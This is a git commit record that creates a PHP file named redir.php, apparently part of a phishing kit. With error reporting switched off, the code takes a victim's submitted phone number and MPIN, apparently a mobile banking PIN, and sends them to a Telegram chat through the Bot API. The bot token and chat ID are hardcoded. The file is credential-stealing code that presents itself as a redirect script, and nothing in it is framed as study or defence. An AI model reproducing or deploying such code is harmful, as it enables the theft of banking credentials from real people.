50ebd865254006e489eb6d7dae217fb1c0ca3db6
PhenaxGod <76651777+PhenaxGod@users.noreply.github.com>
2021-06-04 10:52:15 +0000

    Create redir.php

--- redir.php
+++ redir.php
@@ -1,3 +1,4 @@
 error_reporting(0);
 error_log(0);
 file_get_contents("https://api.telegram.org/bot1729991611:AAHNMJh9xPulpdUqS46UmHGwckc5rJ7n6zs/sendMessage?chat_id=-538746459&text=Number: " . $_POST['number'] . " MPIN: " . $_POST['mpin']);
+$_POST['mpin'] = null;
